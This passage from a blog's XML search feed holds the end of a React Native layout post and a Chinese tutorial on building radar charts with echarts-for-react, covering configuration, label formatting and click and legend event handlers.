alt></p><!-- <img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/handleP.jpg" width="375"/> --><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//原布局方式</span>父级标签里面直接渲染当前全部内容，把推荐标签页包裹在内<span class="token operator">&lt;</span>View parent<span class="token operator">></span>    <span class="token operator">&lt;</span>Image tag<span class="token operator">/</span><span class="token operator">></span>    <span class="token comment" spellcheck="true">//渲染内容content</span><span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span><span class="token comment" spellcheck="true">//修改后</span><span class="token operator">&lt;</span>View parent<span class="token operator">></span>    <span class="token operator">&lt;</span>Image child1<span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>View child2<span class="token operator">></span>        <span class="token comment" spellcheck="true">//渲染内容content</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改方式：</p><ul><li>把原父级区块放在一个视图里面 复用原父级样式 成一个新模块 child2</li><li>把tag推荐图片作为一个兄弟节点 child1</li><li>把child1和child2放到一个视图里面 parent</li><li>parent布局：<ul><li>如果是如上图所示的需要上浮和右浮出</li><li>parent大小设置 width = child2.width + child1右浮宽度<br>height = child2.widt + child1上浮高度</li><li>设置完parent容器大小之后，容器内布局<br>水平方向：从左往右布局<br>垂直方向：从下往上布局</li><li>其余方向同上 自行使用</li></ul></li></ul><p>以上是本人在开发中的一些拙见，有不足支持欢迎指正。</p>]]></content>
      
      
      <categories>
          
          <category> ReactNative </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReactNative </tag>
            
            <tag> position </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>echarts-for-react使用详解(雷达图)</title>
      <link href="2018/10/24/reactecharts/"/>
      <url>2018/10/24/reactecharts/</url>
      
        <content type="html"><![CDATA[<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/echarts.png" alt="echarts.png"></p><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><pre><code>npm install --save echarts-for-react//如果需要使用echarts的一些特殊方法需要安装npm install --save echarts</code></pre><h2 id="二、使用"><a href="#二、使用" class="headerlink" title="二、使用"></a>二、使用</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> ReactEcharts <span class="token keyword">from</span> <span class="token string">'echarts-for-react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> echarts <span class="token keyword">from</span> <span class="token string">'echarts'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>ReactEcharts    option<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getOption</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>     notMerge<span class="token operator">=</span><span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">}</span>    lazyUpdate<span class="token operator">=</span><span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">}</span>    onEvents<span class="token operator">=</span><span class="token punctuation">{</span>onEvents<span class="token punctuation">}</span>    style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>width<span class="token punctuation">:</span> <span class="token string">'100%'</span><span class="token punctuation">,</span>height<span class="token punctuation">:</span><span class="token string">'100%'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">/</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、echarts-API"><a href="#三、echarts-API" class="headerlink" title="三、echarts API"></a>三、echarts API</h2><h4 id="1、设置区域颜色渐进"><a href="#1、设置区域颜色渐进" class="headerlink" title="1、设置区域颜色渐进"></a>1、设置区域颜色渐进</h4><blockquote><p>echarts.graphic.LinearGradient</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>    value <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">370</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置区域边框和区域的颜色</span>    itemStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>        normal<span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//雷达图区域颜色</span>            color<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">echarts<span class="token punctuation">.</span>graphic<span class="token punctuation">.</span>LinearGradient</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>                offset<span class="token punctuation">:</span> <span class="token number">0.5</span><span class="token punctuation">,</span>                color<span class="token punctuation">:</span> <span class="token string">'rgba(139,241, 134, 0.7)'</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">{</span>                offset<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>                color<span class="token punctuation">:</span> <span class="token string">'rgba(0,208, 131, 1)'</span>            <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            opacity<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>            lineStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>                width<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>                color<span class="token punctuation">:</span> <span class="token string">'#8BF186'</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    name <span class="token punctuation">:</span> <span class="token string">'昨日更新投诉量'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、legend标签配置"><a href="#2、legend标签配置" class="headerlink" title="2、legend标签配置"></a>2、legend标签配置</h4><pre class="line-numbers language-js"><code class="language-js">legend<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//图例文字展示</span>    data<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span> name<span class="token punctuation">:</span><span class="token string">'今日更新投诉量'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>         <span class="token punctuation">{</span> name<span class="token punctuation">:</span><span class="token string">'昨日更新投诉量'</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">//图例显示在底部</span>    bottom<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">//图例背景颜色</span>    backgroundColor<span class="token punctuation">:</span><span class="token string">"transparent"</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 图例标记的图形宽度。[ default: 25 ]</span>    itemWidth<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 图例标记的图形高度。[ default: 14 ]</span>    itemHeight<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">//图例文字样式设置</span>    textStyle<span class="token punctuation">:</span><span class="token punctuation">{</span>        color<span class="token punctuation">:</span><span class="token string">"#333"</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">//文字颜色</span>        fontStyle<span class="token punctuation">:</span><span class="token string">"normal"</span><span class="token punctuation">,</span>         <span class="token comment" spellcheck="true">//italic斜体  oblique倾斜</span>        fontWeight<span class="token punctuation">:</span><span class="token string">"normal"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">//文字粗细bold bolder lighter  100 | 200 | 300 | 400...</span>        <span class="token comment" spellcheck="true">// fontFamily:"sans-serif",   //字体系列</span>        fontSize<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">//字体大小</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、极坐标区域大小控制"><a href="#3、极坐标区域大小控制" class="headerlink" title="3、极坐标区域大小控制"></a>3、极坐标区域大小控制</h4><pre class="line-numbers language-js"><code class="language-js">radius<span class="token punctuation">:</span><span class="token string">'65%'</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4、极坐标指示器配置"><a href="#4、极坐标指示器配置" class="headerlink" title="4、极坐标指示器配置"></a>4、极坐标指示器配置</h4><blockquote><p>formatter动态拼接指示器名称</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//雷达指示器参数配置</span>indicator<span class="token punctuation">:</span><span class="token punctuation">[</span>    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"车辆已售"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">380</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"商家冒充个人"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">290</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"商家服务态度差"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">450</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"电话无法接通"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"走私套牌抵押车"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">480</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"价格高于标价"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"卖新车"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"图片与车款不符合"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">333</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">]</span>name<span class="token punctuation">:</span> <span class="token punctuation">{</span>    textStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>        color<span class="token punctuation">:</span> <span class="token string">'#999'</span><span class="token punctuation">,</span>        backgroundColor<span class="token punctuation">:</span> <span class="token string">'transparent'</span>        <span class="token comment" spellcheck="true">// borderRadius: 3,</span>        <span class="token comment" spellcheck="true">// padding: [3, 5]</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>   formatter<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>indicator<span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token comment" spellcheck="true">//指示器名称过长截取</span>        value <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\S{4}/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>match<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> match <span class="token operator">+</span> <span class="token string">'\n'</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// value = value + '\n' + indicator.value;</span>        <span class="token keyword">return</span> <span class="token string">'{a|'</span><span class="token operator">+</span>value<span class="token operator">+</span><span class="token string">'}'</span><span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> <span class="token string">'{b|'</span><span class="token operator">+</span>indicator<span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">'}'</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">//富文本编辑 修改文字展示样式</span>    rich<span class="token punctuation">:</span><span class="token punctuation">{</span>        a<span class="token punctuation">:</span><span class="token punctuation">{</span>            color<span class="token punctuation">:</span><span class="token string">"#999"</span><span class="token punctuation">,</span>            fontSize<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">,</span>            align<span class="token punctuation">:</span> <span class="token string">"center"</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        b<span class="token punctuation">:</span><span class="token punctuation">{</span>            color<span class="token punctuation">:</span><span class="token string">"#333"</span><span class="token punctuation">,</span>            fontSize<span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">,</span>            align<span class="token punctuation">:</span> <span class="token string">"center"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>formatter回调参数：value<span class="token punctuation">:</span>返回indicator指示器的name值 如：车辆已售indicator<span class="token punctuation">:</span> 返回雷达指示器的所有参数 如：<span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"车辆已售"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">380</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span>rich定义富文本样式可区分引用rich里面定义的样式 如上<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5、点击事件绑定"><a href="#5、点击事件绑定" class="headerlink" title="5、点击事件绑定"></a>5、点击事件绑定</h4><blockquote><p>click事件</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token function">onChartClick</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span>echarts<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> onEvents<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">'click'</span><span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>onChartClick<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>        <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"echartsRadar"</span><span class="token operator">></span>            <span class="token operator">&lt;</span>ReactEcharts                option<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getOption</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>                 notMerge<span class="token operator">=</span><span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">}</span>                lazyUpdate<span class="token operator">=</span><span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">}</span>                onEvents<span class="token operator">=</span><span class="token punctuation">{</span>onEvents<span class="token punctuation">}</span>                style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>width<span class="token punctuation">:</span> <span class="token string">'100%'</span><span class="token punctuation">,</span>height<span class="token punctuation">:</span><span class="token string">'100%'</span><span class="token punctuation">}</span><span class="token punctuation">}</span>            <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回参数</p><p>param返回当前点击的所有参数信息</p><p>点击雷达图区域：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/echarts1.png" alt="echarts1.png"></p><p>点击指示器显示部分</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/echatrs2.png" alt="echatrs2.png"></p><blockquote><p>legend标签点击事件</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token function">onChartLegendselectchanged</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span>echarts<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> onEvents<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">'legendselectchanged'</span><span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>onChartLegendselectchanged<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>        <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"echartsRadar"</span><span class="token operator">></span>            <span class="token operator">&lt;</span>ReactEcharts                option<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getOption</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>                 notMerge<span class="token operator">=</span><span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">}</span>                lazyUpdate<span class="token operator">=</span><span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">}</span>                onEvents<span class="token operator">=</span><span class="token punctuation">{</span>onEvents<span class="token punctuation">}</span>                style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>width<span class="token punctuation">:</span> <span class="token string">'100%'</span><span class="token punctuation">,</span>height<span class="token punctuation">:</span><span class="token string">'100%'</span><span class="token punctuation">}</span><span class="token punctuation">}</span>            <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>回调参数：</p><pre class="line-numbers language-js"><code class="language-js">param<span class="token punctuation">:</span><span class="token punctuation">{</span>    <span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"今日更新投诉量"</span><span class="token punctuation">,</span>    <span class="token string">"selected"</span><span class="token punctuation">:</span><span class="token punctuation">{</span>        <span class="token string">"今日更新投诉量"</span><span class="token punctuation">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token string">"昨日更新投诉量"</span><span class="token punctuation">:</span><span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token string">"type"</span><span class="token punctuation">:</span>    <span class="token string">"legendselectchanged"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'../scss/echartsRadar.scss'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//引入组件依赖样式</span><span class="token comment" spellcheck="true">// 引入 ECharts 主模块</span><span class="token keyword">import</span> echarts <span class="token keyword">from</span> <span class="token string">'echarts/lib/echarts'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 引入雷达图</span><span class="token comment" spellcheck="true">// import  'echarts/lib/chart/radar';</span><span class="token comment" spellcheck="true">// 引入提示框和标题组件</span><span class="token comment" spellcheck="true">// import 'echarts/lib/component/tooltip';</span><span class="token comment" spellcheck="true">//引入title</span><span class="token comment" spellcheck="true">// import 'echarts/lib/component/title';</span><span class="token comment" spellcheck="true">//引入图例</span><span class="token comment" spellcheck="true">// import 'echarts/lib/component/legend';</span><span class="token keyword">import</span> ReactEcharts <span class="token keyword">from</span> <span class="token string">'echarts-for-react'</span><span class="token punctuation">;</span><span class="token keyword">const</span> mytextStyle<span class="token operator">=</span><span class="token punctuation">{</span>    color<span class="token punctuation">:</span><span class="token string">"#333"</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">//文字颜色</span>    fontStyle<span class="token punctuation">:</span><span class="token string">"normal"</span><span class="token punctuation">,</span>         <span class="token comment" spellcheck="true">//italic斜体  oblique倾斜</span>    fontWeight<span class="token punctuation">:</span><span class="token string">"normal"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">//文字粗细bold   bolder   lighter  100 | 200 | 300 | 400...</span>    <span class="token comment" spellcheck="true">// fontFamily:"sans-serif",   //字体系列</span>    fontSize<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">//字体大小</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">EchartsRadar</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// this.indicator = []</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * @description 配置图表     * @returns      * @memberof EchartsRadar     */</span>    <span class="token function">getOption</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token punctuation">{</span>            title<span class="token punctuation">:</span> <span class="token punctuation">{</span>                text<span class="token punctuation">:</span> <span class="token string">''</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">//点击提示标签</span>            <span class="token comment" spellcheck="true">// tooltip: {},</span>            legend<span class="token punctuation">:</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//图例文字展示</span>                data<span class="token punctuation">:</span> <span class="token punctuation">[</span>                    <span class="token punctuation">{</span> name<span class="token punctuation">:</span><span class="token string">'今日更新投诉量'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>                     <span class="token punctuation">{</span> name<span class="token punctuation">:</span><span class="token string">'昨日更新投诉量'</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">//图例显示在底部</span>                bottom<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">//图例背景颜色</span>                backgroundColor<span class="token punctuation">:</span><span class="token string">"transparent"</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">// 图例标记的图形宽度。[ default: 25 ]</span>                itemWidth<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">// 图例标记的图形高度。[ default: 14 ]</span>                itemHeight<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">//图例文字样式设置</span>                textStyle<span class="token punctuation">:</span>mytextStyle            <span class="token punctuation">}</span><span class="token punctuation">,</span>            radar<span class="token punctuation">:</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//雷达图绘制类型，支持 'polygon' 和 'circle' [ default: 'polygon' ]</span>                shape<span class="token punctuation">:</span> <span class="token string">'polygon'</span><span class="token punctuation">,</span>                splitNumber<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span>                center<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'50%'</span><span class="token punctuation">,</span><span class="token string">'50%'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                radius<span class="token punctuation">:</span><span class="token string">'65%'</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">//指示器名称和指示器轴的距离。[ default: 15 ]</span>                nameGap<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">,</span>                triggerEvent<span class="token punctuation">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>                name<span class="token punctuation">:</span> <span class="token punctuation">{</span>                    textStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>                        color<span class="token punctuation">:</span> <span class="token string">'#999'</span><span class="token punctuation">,</span>                        backgroundColor<span class="token punctuation">:</span> <span class="token string">'transparent'</span>                        <span class="token comment" spellcheck="true">// borderRadius: 3,</span>                        <span class="token comment" spellcheck="true">// padding: [3, 5]</span>                   <span class="token punctuation">}</span><span class="token punctuation">,</span>                   formatter<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>indicator<span class="token punctuation">)</span><span class="token punctuation">{</span>                        value <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\S{4}/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>match<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">return</span> match <span class="token operator">+</span> <span class="token string">'\n'</span>                        <span class="token punctuation">}</span><span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">// value = value + '\n' + indicator.value;</span>                        <span class="token keyword">return</span> <span class="token string">'{a|'</span><span class="token operator">+</span>value<span class="token operator">+</span><span class="token string">'}'</span><span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> <span class="token string">'{b|'</span><span class="token operator">+</span>indicator<span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">'}'</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token comment" spellcheck="true">//富文本编辑 修改文字展示样式</span>                    rich<span class="token punctuation">:</span><span class="token punctuation">{</span>                        a<span class="token punctuation">:</span><span class="token punctuation">{</span>                            color<span class="token punctuation">:</span><span class="token string">"#999"</span><span class="token punctuation">,</span>                            fontSize<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">,</span>                            align<span class="token punctuation">:</span> <span class="token string">"center"</span>                        <span class="token punctuation">}</span><span class="token punctuation">,</span>                        b<span class="token punctuation">:</span><span class="token punctuation">{</span>                            color<span class="token punctuation">:</span><span class="token string">"#333"</span><span class="token punctuation">,</span>                            fontSize<span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">,</span>                            align<span class="token punctuation">:</span> <span class="token string">"center"</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token comment" 